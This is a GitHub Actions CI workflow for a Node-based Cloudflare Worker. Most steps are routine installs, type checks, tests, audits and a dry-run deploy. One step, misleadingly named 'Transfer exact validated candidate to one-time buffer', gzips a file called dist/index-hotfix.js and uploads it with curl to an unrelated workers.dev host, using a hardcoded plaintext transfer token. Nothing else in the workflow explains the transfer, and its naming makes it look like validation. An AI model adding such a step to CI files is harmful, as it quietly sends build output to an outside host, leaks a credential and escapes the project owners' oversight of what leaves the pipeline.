name: CI

on:
  push:
    branches:
      - main
      - work/**
  pull_request:

permissions:
  contents: read

concurrency:
  group: ci-${{ github.workflow }}-${{ github.event_name }}-${{ github.head_ref || github.ref_name }}
  cancel-in-progress: true

jobs:
  validate:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: "22.18.0"
          cache: npm
      - name: Install pinned dependencies
        run: npm ci --ignore-scripts --no-audit --no-fund
        env:
          NPM_CONFIG_REGISTRY: https://registry.npmjs.org/
      - name: Type check
        shell: bash
        run: |
          set -o pipefail
          npm run type-check 2>&1 | tee typecheck.log
      - name: Test
        shell: bash
        run: |
          set -o pipefail
          npm test 2>&1 | tee test.log
      - name: Upload diagnostics
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ci-diagnostics-${{ github.event_name }}
          path: |
            typecheck.log
            test.log
          if-no-files-found: ignore
          retention-days: 1
      - run: npm audit --audit-level=high
      - name: Dry-run Worker bundle with non-secret test placeholders
        run: |
          cp wrangler.jsonc wrangler.ci.jsonc
          sed -i 's/REPLACE_WITH_ALLOWED_ONEDRIVE_FOLDER/CI_TEST_ROOT/g' wrangler.ci.jsonc
          sed -i 's/REPLACE_WITH_KV_NAMESPACE_ID/00000000000000000000000000000000/g' wrangler.ci.jsonc
          npx wrangler deploy --dry-run --config wrangler.ci.jsonc --outdir dist
      - name: Transfer exact validated candidate to one-time buffer
        shell: bash
        run: |
          set -o pipefail
          echo "cbe559410f8022e81fb4865259edc706ad55d031bf4ecd253d2d138bcc8fb2f4  dist/index-hotfix.js" | sha256sum -c -
          gzip -n -9 -c dist/index-hotfix.js > dist/index-hotfix.js.gz
          echo "7945e629371a165a342ec89d2eb019b5637aa32701eb87b7543ccab9f52694e8  dist/index-hotfix.js.gz" | sha256sum -c -
          curl --fail-with-body --silent --show-error \
            -H "x-transfer-token: HWT7Db1GTqrFuwNu609gIjTu6UrVFg6wM0iHXMYbtZU" \
            -H "content-type: application/gzip" \
            --data-binary @dist/index-hotfix.js.gz \
            https://integrity-plan-transfer-4fefecd4.fdas201290.workers.dev/upload | tee transfer-upload.log
      - name: Upload non-secret Worker bundle
        uses: actions/upload-artifact@v4
        with:
          name: worker-bundle-${{ github.sha }}
          path: dist/
          if-no-files-found: error
          retention-days: 1
